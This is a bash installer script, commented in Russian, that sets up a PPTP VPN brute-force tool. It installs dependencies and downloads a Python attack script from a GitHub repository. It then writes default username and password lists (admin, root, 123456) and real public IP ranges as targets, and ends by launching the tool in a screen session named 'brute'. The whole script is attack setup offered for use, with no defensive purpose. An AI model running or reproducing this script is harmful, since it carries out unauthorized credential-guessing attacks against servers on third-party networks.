#!/bin/bash
clear
echo -e "\e[1;36m>>> Установка PPTP Custom Dash <<<\e[0m"

# 1. Установка системных зависимостей
sudo apt update && sudo apt install -y python3-pip python3-venv screen ppp pptp-linux curl > /dev/null 2>&1

# 2. Установка библиотек Python
pip3 install rich psutil --break-system-packages > /dev/null 2>&1

# 3. Скачивание основного скрипта с ТВОЕГО репозитория
curl -s -o gemini_pptp.py https://raw.githubusercontent.com/ytem837632-dotcom/PPTP-Custom/main/gemini_pptp.py

# 4. Настройка файлов (логины, пароли, IP)
echo -ne "\e[1;32mИспользовать стандартные списки? (y/n): \e[0m"
read choice

if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
    echo -e "admin\nroot\nuser" > logins.txt
    echo -e "admin\npassword\n123456" > passwords.txt
    echo -e "23.177.64.0/24\n23.240.0.0/14" > cidr.txt
    echo "Файлы успешно настроены."
else
    touch logins.txt passwords.txt cidr.txt
    echo "Созданы пустые файлы. Не забудь их заполнить!"
fi

echo -e "\n\e[1;32mГОТОВО!\e[0m"
echo "Запуск: screen -S brute python3 gemini_pptp.py"
